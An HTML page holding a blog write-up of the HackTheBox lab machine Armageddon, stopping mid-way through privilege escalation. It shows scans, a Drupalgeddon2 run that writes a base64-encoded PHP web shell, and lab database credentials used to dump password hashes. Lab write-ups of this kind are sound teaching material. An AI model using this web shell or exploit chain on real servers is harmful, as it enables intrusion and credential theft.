@@ -1,0 +1,483 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <title>
+  HTB: Armageddon Writeup · mattjohnson.cloud
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="matt johnson">
+<meta name="description" content="Here&#39;s how to solve HackTheBox&#39;s Armageddon.">
+<meta name="keywords" content="blog,cloud,personal,security,windows,chess">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="HTB: Armageddon Writeup">
+  <meta name="twitter:description" content="Here&#39;s how to solve HackTheBox&#39;s Armageddon.">
+
+<meta property="og:url" content="http://www.mattjohnson.de/posts/htb-armageddon/">
+  <meta property="og:site_name" content="mattjohnson.cloud">
+  <meta property="og:title" content="HTB: Armageddon Writeup">
+  <meta property="og:description" content="Here&#39;s how to solve HackTheBox&#39;s Armageddon.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2021-07-25T00:00:00+00:00">
+    <meta property="article:modified_time" content="2021-07-25T00:00:00+00:00">
+    <meta property="article:tag" content="Hackthebox">
+    <meta property="article:tag" content="Security">
+
+
+
+
+<link rel="canonical" href="http://www.mattjohnson.de/posts/htb-armageddon/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.min.7763f8bc6341ecf82378e867c285e1549abb063a899be313ccd25dbfcd24fa7d.css" integrity="sha256-d2P4vGNB7PgjeOhnwoXhVJq7BjqJm&#43;MTzNJdv80k&#43;n0=" crossorigin="anonymous" media="screen" />
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="http://www.mattjohnson.de/">
+      mattjohnson.cloud
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/about/">about</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/posts/">blog</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/tags/">tags</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="http://www.mattjohnson.de/posts/htb-armageddon/">
+              HTB: Armageddon Writeup
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2021-07-25T00:00:00Z">
+                July 25, 2021
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              6-minute read
+            </span>
+          </div>
+          <div class="authors">
+  <i class="fa-solid fa-user" aria-hidden="true"></i>
+    <a href="/authors/matt-johnson/">Matt Johnson</a></div>
+
+          
+          <div class="tags">
+  <i class="fa-solid fa-tag" aria-hidden="true"></i>
+    <span class="tag">
+      <a href="/tags/hackthebox/">Hackthebox</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/security/">Security</a>
+    </span></div>
+
+        </div>
+      </header>
+
+      <div class="post-content">
+        
+        <div class="custom-toc">
+    <nav id="TableOfContents">
+  <ol>
+    <li><a href="#high-level-information">High-Level Information</a></li>
+    <li><a href="#initial-foothold">Initial Foothold</a></li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+  </ol>
+</nav>
+</div>
+<h1 id="high-level-information">
+  High-Level Information
+  <a class="heading-link" href="#high-level-information">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p><strong>Machine Name:</strong> Armageddon</p>
+<p><strong>IP Address:</strong> 10.10.10.233</p>
+<p><strong>Difficulty:</strong> Easy</p>
+<p><strong>Summary:</strong> HackTheBox&rsquo;s Armageddon was a relatively easy box, so long as you didn&rsquo;t fall down the rabbit hole. Getting initial access to the machine was as simple as running a PoC exploit against a vulnerable Drupal version. Once on the box, the <code>apache</code> user was capable of running MySQL queries, from which you can find an easily crackable password hash of the <code>brucetherealadmin</code> user. From there, one needs to craft a malicious snap package in order to escalate privileges to <code>root</code>.</p>
+<p><strong>Tools Used:</strong> Nmap, Gobuster, <a href="https://github.com/dreadlocked/Drupalgeddon2"  class="external-link" target="_blank" rel="noopener">Drupalgeddon2</a>, MySQL, john, fpm, snap</p>
+<h1 id="initial-foothold">
+  Initial Foothold
+  <a class="heading-link" href="#initial-foothold">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>As always, I began by running Nmap:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali@kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/armageddon<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>└─$ nmap -sC -sV -p- -oA nmap/nmap 10.10.10.233
+</span></span><span style="display:flex;"><span>Starting Nmap 7.91 <span style="color:#ff7b72;font-weight:bold">(</span> https://nmap.org <span style="color:#ff7b72;font-weight:bold">)</span> at 2021-07-23 07:22 EDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#ff7b72">for</span> 10.10.10.233
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#ff7b72;font-weight:bold">(</span>0.035s latency<span style="color:#ff7b72;font-weight:bold">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#a5d6ff">65533</span> closed ports
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 7.4 <span style="color:#ff7b72;font-weight:bold">(</span>protocol 2.0<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#a5d6ff">2048</span> 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 <span style="color:#ff7b72;font-weight:bold">(</span>RSA<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#a5d6ff">256</span> 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc <span style="color:#ff7b72;font-weight:bold">(</span>ECDSA<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#a5d6ff">256</span> 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 <span style="color:#ff7b72;font-weight:bold">(</span>ED25519<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.6 <span style="color:#ff7b72;font-weight:bold">((</span>CentOS<span style="color:#ff7b72;font-weight:bold">)</span> PHP/5.4.16<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>|_http-generator: Drupal <span style="color:#a5d6ff">7</span> <span style="color:#ff7b72;font-weight:bold">(</span>http://drupal.org<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>| http-robots.txt: <span style="color:#a5d6ff">36</span> disallowed entries <span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">15</span> shown<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
+</span></span><span style="display:flex;"><span>| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
+</span></span><span style="display:flex;"><span>| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
+</span></span><span style="display:flex;"><span>|_/LICENSE.txt /MAINTAINERS.txt
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.6 <span style="color:#ff7b72;font-weight:bold">(</span>CentOS<span style="color:#ff7b72;font-weight:bold">)</span> PHP/5.4.16
+</span></span><span style="display:flex;"><span>|_http-title: Welcome to  Armageddon |  Armageddon
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#ff7b72">done</span>: <span style="color:#a5d6ff">1</span> IP address <span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">1</span> host up<span style="color:#ff7b72;font-weight:bold">)</span> scanned in 35.31 seconds
+</span></span></code></pre></div><p>Once I discovered that port 80 was open, I enumerated directories with Gobuster:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali@kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/armageddon<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t <span style="color:#a5d6ff">100</span> -u http://10.10.10.233
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">===============================================================</span>
+</span></span><span style="display:flex;"><span>Gobuster v3.1.0
+</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#ff7b72;font-weight:bold">(</span>@TheColonial<span style="color:#ff7b72;font-weight:bold">)</span> &amp; Christian Mehlmauer <span style="color:#ff7b72;font-weight:bold">(</span>@firefart<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">===============================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Url:                     http://10.10.10.233
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Method:                  GET
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Threads:                 <span style="color:#a5d6ff">100</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Negative Status codes:   <span style="color:#a5d6ff">404</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> User Agent:              gobuster/3.1.0
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Timeout:                 <span style="color:#79c0ff">10s</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">===============================================================</span>
+</span></span><span style="display:flex;"><span>2021/07/23 07:23:50 Starting gobuster in directory enumeration <span style="color:#79c0ff">mode</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">===============================================================</span>
+</span></span><span style="display:flex;"><span>/themes               <span style="color:#ff7b72;font-weight:bold">(</span>Status: 301<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">[</span>Size: 235<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#ff7b72;font-weight:bold">[</span>--&gt; http://10.10.10.233/themes/<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>/modules              <span style="color:#ff7b72;font-weight:bold">(</span>Status: 301<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">[</span>Size: 236<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#ff7b72;font-weight:bold">[</span>--&gt; http://10.10.10.233/modules/<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>/scripts              <span style="color:#ff7b72;font-weight:bold">(</span>Status: 301<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">[</span>Size: 236<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#ff7b72;font-weight:bold">[</span>--&gt; http://10.10.10.233/scripts/<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>/sites                <span style="color:#ff7b72;font-weight:bold">(</span>Status: 301<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">[</span>Size: 234<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#ff7b72;font-weight:bold">[</span>--&gt; http://10.10.10.233/sites/<span style="color:#ff7b72;font-weight:bold">]</span>  
+</span></span><span style="display:flex;"><span>/includes             <span style="color:#ff7b72;font-weight:bold">(</span>Status: 301<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">[</span>Size: 237<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#ff7b72;font-weight:bold">[</span>--&gt; http://10.10.10.233/includes/<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>/profiles             <span style="color:#ff7b72;font-weight:bold">(</span>Status: 301<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">[</span>Size: 237<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#ff7b72;font-weight:bold">[</span>--&gt; http://10.10.10.233/profiles/<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>/misc                 <span style="color:#ff7b72;font-weight:bold">(</span>Status: 301<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">[</span>Size: 233<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#ff7b72;font-weight:bold">[</span>--&gt; http://10.10.10.233/misc/<span style="color:#ff7b72;font-weight:bold">]</span>    
+</span></span><span style="display:flex;"><span>/poc                  <span style="color:#ff7b72;font-weight:bold">(</span>Status: 200<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">[</span>Size: 21776<span style="color:#ff7b72;font-weight:bold">]</span>                                  
+</span></span><span style="display:flex;"><span>                                                                                    
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">===============================================================</span>
+</span></span><span style="display:flex;"><span>2021/07/23 07:25:31 <span style="color:#79c0ff">Finished</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">===============================================================</span>
+</span></span><span style="display:flex;"><span>        
+</span></span></code></pre></div><p>Nested within the <code>/modules/</code> directory (<code>/modules/system/</code> to be more precise) was a file <code>system.info</code>, which identified the Drupal version as 7.56.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ini" data-lang="ini"><span style="display:flex;"><span>name <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">System</span>
+</span></span><span style="display:flex;"><span>description <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">Handles general site configuration for administrators.</span>
+</span></span><span style="display:flex;"><span>package <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">Core</span>
+</span></span><span style="display:flex;"><span>version <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">VERSION</span>
+</span></span><span style="display:flex;"><span>core <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">7.x</span>
+</span></span><span style="display:flex;"><span>files[] <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">system.archiver.inc</span>
+</span></span><span style="display:flex;"><span>files[] <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">system.mail.inc</span>
+</span></span><span style="display:flex;"><span>files[] <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">system.queue.inc</span>
+</span></span><span style="display:flex;"><span>files[] <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">system.tar.inc</span>
+</span></span><span style="display:flex;"><span>files[] <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">system.updater.inc</span>
+</span></span><span style="display:flex;"><span>files[] <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">system.test</span>
+</span></span><span style="display:flex;"><span>required <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">TRUE</span>
+</span></span><span style="display:flex;"><span>configure <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">admin/config/system</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">; Information added by Drupal.org packaging script on 2017-06-21</span>
+</span></span><span style="display:flex;"><span>version <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;7.56&#34;</span>
+</span></span><span style="display:flex;"><span>project <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;drupal&#34;</span>
+</span></span><span style="display:flex;"><span>datestamp <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;1498069849&#34;</span>
+</span></span></code></pre></div><p>A cursory Google search of the version leads you to a PoC RCE exploit, Drupalgeddon2. Running it grants you a basic PHP shell:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali@kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/armageddon/drupalexploit<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>└─$ ./drupalgeddon2.rb http://10.10.10.233
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> --<span style="color:#ff7b72;font-weight:bold">==[</span>::#Drupalggedon2::<span style="color:#ff7b72;font-weight:bold">]==</span>--
+</span></span><span style="display:flex;"><span>--------------------------------------------------------------------------------
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>i<span style="color:#ff7b72;font-weight:bold">]</span> Target : http://10.10.10.233/
+</span></span><span style="display:flex;"><span>--------------------------------------------------------------------------------
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Found  : http://10.10.10.233/CHANGELOG.txt    <span style="color:#ff7b72;font-weight:bold">(</span>HTTP Response: 200<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Drupal!: v7.56
+</span></span><span style="display:flex;"><span>--------------------------------------------------------------------------------
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Testing: Form   <span style="color:#ff7b72;font-weight:bold">(</span>user/password<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Result : Form valid
+</span></span><span style="display:flex;"><span>- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>*<span style="color:#ff7b72;font-weight:bold">]</span> Testing: Clean URLs
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>!<span style="color:#ff7b72;font-weight:bold">]</span> Result : Clean URLs disabled <span style="color:#ff7b72;font-weight:bold">(</span>HTTP Response: 404<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>i<span style="color:#ff7b72;font-weight:bold">]</span> Isn<span style="color:#a5d6ff">&#39;t an issue for Drupal v7.x
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">--------------------------------------------------------------------------------
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">[*] Testing: Code Execution   (Method: name)
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">[i] Payload: echo VJNRMOSG
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">[+] Result : VJNRMOSG
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">--------------------------------------------------------------------------------
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">[*] Testing: Existing file   (http://10.10.10.233/shell.php)
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">[i] Response: HTTP 404 // Size: 5
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">[*] Testing: Writing To Web Root   (./)
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">[+] Result : &amp;1&#39;</span> <span style="color:#ff7b72;font-weight:bold">)</span>; <span style="color:#ff7b72;font-weight:bold">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
+</span></span><span style="display:flex;"><span>--------------------------------------------------------------------------------
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>i<span style="color:#ff7b72;font-weight:bold">]</span> Fake PHP shell:   curl <span style="color:#a5d6ff">&#39;http://10.10.10.233/shell.php&#39;</span> -d <span style="color:#a5d6ff">&#39;c=hostname&#39;</span>
+</span></span><span style="display:flex;"><span>armageddon.htb&gt;&gt; whoami
+</span></span><span style="display:flex;"><span>apache
+</span></span><span style="display:flex;"><span>armageddon.htb&gt;&gt;
+</span></span></code></pre></div><h1 id="privilege-escalation">
+  Privilege Escalation
+  <a class="heading-link" href="#privilege-escalation">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>In doing some manual enumeration, I discovered that MySQL was running on the host. From previous experience I know that DB credentials sometimes exist in Drupal configuration files. I enumerated the web server and came across <code>sites/default/settings.php</code>, which included the following credentials:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#79c0ff">$databases</span> <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#ff7b72">array</span> (                                                                                                                                                                               
+</span></span><span style="display:flex;"><span>            <span style="color:#a5d6ff">&#39;default&#39;</span> <span style="color:#ff7b72;font-weight:bold">=&gt;</span>                                                                                                                                                                                     
+</span></span><span style="display:flex;"><span>            <span style="color:#ff7b72">array</span> (                                                                                                                                                                                          
+</span></span><span style="display:flex;"><span>              <span style="color:#a5d6ff">&#39;default&#39;</span> <span style="color:#ff7b72;font-weight:bold">=&gt;</span>                                                                                                                                                                                   
+</span></span><span style="display:flex;"><span>              <span style="color:#ff7b72">array</span> (                                                                                                                                                                                        
+</span></span><span style="display:flex;"><span>                <span style="color:#a5d6ff">&#39;database&#39;</span> <span style="color:#ff7b72;font-weight:bold">=&gt;</span> <span style="color:#a5d6ff">&#39;drupal&#39;</span>,                                                                                                                                                                      
+</span></span><span style="display:flex;"><span>                <span style="color:#a5d6ff">&#39;username&#39;</span> <span style="color:#ff7b72;font-weight:bold">=&gt;</span> <span style="color:#a5d6ff">&#39;drupaluser&#39;</span>,                                                                                                                                                                  
+</span></span><span style="display:flex;"><span>                <span style="color:#a5d6ff">&#39;password&#39;</span> <span style="color:#ff7b72;font-weight:bold">=&gt;</span> <span style="color:#a5d6ff">&#39;CQHEy@9M*m23gBVj&#39;</span>,                                                                                                                                                            
+</span></span><span style="display:flex;"><span>                <span style="color:#a5d6ff">&#39;host&#39;</span> <span style="color:#ff7b72;font-weight:bold">=&gt;</span> <span style="color:#a5d6ff">&#39;localhost&#39;</span>,                                                                                                                                                                       
+</span></span><span style="display:flex;"><span>                <span style="color:#a5d6ff">&#39;port&#39;</span> <span style="color:#ff7b72;font-weight:bold">=&gt;</span> <span style="color:#a5d6ff">&#39;&#39;</span>,                                                                                                                                                                                
+</span></span><span style="display:flex;"><span>                <span style="color:#a5d6ff">&#39;driver&#39;</span> <span style="color:#ff7b72;font-weight:bold">=&gt;</span> <span style="color:#a5d6ff">&#39;mysql&#39;</span>,                                                                                                                                                                         
+</span></span><span style="display:flex;"><span>                <span style="color:#a5d6ff">&#39;prefix&#39;</span> <span style="color:#ff7b72;font-weight:bold">=&gt;</span> <span style="color:#a5d6ff">&#39;&#39;</span>,                                                                                                                                                                              
+</span></span><span style="display:flex;"><span>              ),                                                                                                                                                                                             
+</span></span><span style="display:flex;"><span>            ),                                                                                                                                                                                               
+</span></span><span style="display:flex;"><span>          );
+</span></span></code></pre></div><p>Worth noting that the fake shell isn&rsquo;t actually interactive, so one-liners are your friend. Running some MySQL one-liners using the credentials led me to a password hash for <code>brucetherealadmin</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>armageddon.htb&gt;&gt; mysql --user<span style="color:#ff7b72;font-weight:bold">=</span>drupaluser --pass<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#39;CQHEy@9M*m23gBVj&#39;</span> -e <span style="color:#a5d6ff">&#39;SHOW TABLES&#39;</span> Drupal
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>users
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>armageddon.htb&gt;&gt; mysql --user<span style="color:#ff7b72;font-weight:bold">=</span>drupaluser --pass<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#39;CQHEy@9M*m23gBVj&#39;</span> -e <span style="color:#a5d6ff">&#39;SELECT * FROM users&#39;</span> drupal
+</span></span><span style="display:flex;"><span>uid     name    pass    mail    theme   signature       signature_format        created access  login   status  timezone        language        picture init    data
+</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">0</span>                                               NULL    <span style="color:#a5d6ff">0</span>       <span style="color:#a5d6ff">0</span>       <span style="color:#a5d6ff">0</span>       <span style="color:#a5d6ff">0</span>       NULL            <span style="color:#a5d6ff">0</span>               NULL
